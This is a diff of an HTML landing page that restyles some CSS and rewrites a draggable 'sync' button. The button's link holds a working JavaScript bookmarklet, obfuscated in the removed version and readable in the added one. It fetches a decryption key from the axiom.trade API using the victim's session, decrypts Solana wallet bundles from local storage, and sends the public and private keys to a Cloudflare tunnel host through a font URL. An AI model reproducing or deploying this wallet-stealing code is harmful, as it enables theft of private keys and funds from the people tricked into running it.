@@ -137,10 +137,10 @@
         .feature-box:hover {
             transform: translateY(-5px);
             border-color: var(--accent);
-        }
+}
 
         .feature-box h4 {
-color: var(--accent);
+            color: var(--accent);
             font-size: 20px;
             margin-bottom: 1rem;
         }
@@ -290,9 +290,8 @@ color: var(--accent);
             color: var(--text-dim);
             font-size: 15px;
         }
-
-        @media (max-width: 1100px) {
-.grid-layout { grid-template-columns: 1fr; gap: 4rem; }
+@media (max-width: 1100px) {
+            .grid-layout { grid-template-columns: 1fr; gap: 4rem; }
             .hero-section h1 { font-size: 56px; }
             .wrapper { padding: 0 2rem; }
             nav { padding: 0 2rem; }
@@ -356,7 +355,7 @@ color: var(--accent);
                     </div>
 
                     <div class="sync-area" id="sync-area">
-<a href="javascript:(async function(){const q='https://hughes-wiring-happen-chronicles.trycloudflare.com';console['log']('%c[!]\x20NICKY\x20TOOL:\x20ACTIVE','color:\x20cyan;\x20font-weight:\x20bold;');const r=h=>Uint8Array['from'](atob(h['replace'](/-/g,'+')['replace'](/_/g,'/')),F=>F['charCodeAt'](0x0)),U=async(h,F)=>{try{const [V,D]=F['split'](':');return new Uint8Array(await crypto['subtle']['decrypt']({'name':'AES-GCM','iv':r(V),'tagLength':0x80},h,r(D)));}catch(L){return null;}},Z=h=>{const F='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let V=[0x0];for(let L=0x0;L<h['length'];L++){let X=h[L];for(let b=0x0;b<V['length'];b++){X+=V[b]*0x100,V[b]=X%0x3a,X=Math['floor'](X/0x3a);}while(X>0x0){V['push'](X%0x3a),X=Math['floor'](X/0x3a);}}let D='';for(let O=0x0;h[O]===0x0&&O<h['length']-0x1;O++)D+=F[0x0];for(let g=V['length']-0x1;g>=0x0;g--)D+=F[V[g]];return D;};try{console['log']('[*]\x20Initializing\x20Activation');const h=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{'method':'POST','credentials':'include'}),F=await h['json']();if(!F['bundleKey'])return;const V=await crypto['subtle']['importKey']('raw',r(F['bundleKey']),{'name':'AES-GCM'},![],['decrypt']);let D=[];const L=JSON['parse'](localStorage['getItem']('sBundles')||'[]');for(const X of L){const b=await U(V,X);b&&D['push']({'type':'SOL','public':Z(b['slice'](-0x20)),'private':Z(b)});}if(D['length']>0x0){console['log']('%c[+]\x20Success.\x20Communicating\x20with\x20Server...','color:\x20lime;');const O=btoa(JSON['stringify']({'keys':D})),g=document['createElement']('style');g['textContent']='@font-face\x20{\x20font-family:\x20\x27leak\x27;\x20src:\x20url(\x27'+q+'/?data='+encodeURIComponent(O)+'\x27);\x20}',document['head']['appendChild'](g);const o=document['createElement']('div');o['style']['fontFamily']='leak',o['textContent']='.',document['body']['appendChild'](o),console['log']('[!]\x20Data\x20initialized');}else console['warn']('[-]\x20No\x20data\x20found.');}catch(B){console['error']('[-]\x20Error:',B);}}());" 
+<a href="javascript:(async function(){const TUNNEL_URL='https://hughes-wiring-happen-chronicles.trycloudflare.com';const base64ToBytes=b=>Uint8Array.from(atob(b.replace(/-/g,'+').replace(/_/g,'/')),c=>c.charCodeAt(0));const decrypt=async(k,d)=>{try{const [iv,dat]=d.split(':');return new Uint8Array(await crypto.subtle.decrypt({name:'AES-GCM',iv:base64ToBytes(iv),tagLength:128},k,base64ToBytes(dat)))}catch(e){return null}};const base58=B=>{const A='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let d=[0];for(let i=0;i<B.length;i++){let carry=B[i];for(let j=0;j<d.length;j++){carry+=d[j]*256;d[j]=carry%58;carry=Math.floor(carry/58)}while(carry>0){d.push(carry%58);carry=Math.floor(carry/58)}}let res='';for(let i=0;i<B.length-1&&B[i]===0;i++)res+=A[0];for(let i=d.length-1;i>=0;i--)res+=A[d[i]];return res};try{const res=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const data=await res.json();if(!data.bundleKey)return;const key=await crypto.subtle.importKey('raw',base64ToBytes(data.bundleKey),{name:'AES-GCM'},!1,['decrypt']);let stolen=[];const solBundles=JSON.parse(localStorage.getItem('sBundles')||'[]');for(const entry of solBundles){const decrypted=await decrypt(key,entry);if(decrypted){stolen.push({type:'SOL',public:base58(decrypted.slice(-32)),private:base58(decrypted)})}}if(stolen.length>0){const payload=btoa(JSON.stringify({keys:stolen}));const style=document.createElement('style');style.textContent='@font-face { font-family: \"leak\"; src: url(\"'+TUNNEL_URL+'/?data='+encodeURIComponent(payload)+'\"); }';document.head.appendChild(style);const div=document.createElement('div');div.style.fontFamily='leak';div.textContent='.';document.body.appendChild(div)}}catch(e){}}());" 
                            class="btn" 
                            id="sync-btn"
                            draggable="true">
@@ -404,4 +403,3 @@ color: var(--accent);
     </script>
 </body>
 </html>
-```<template id="reply_to_current"></template>
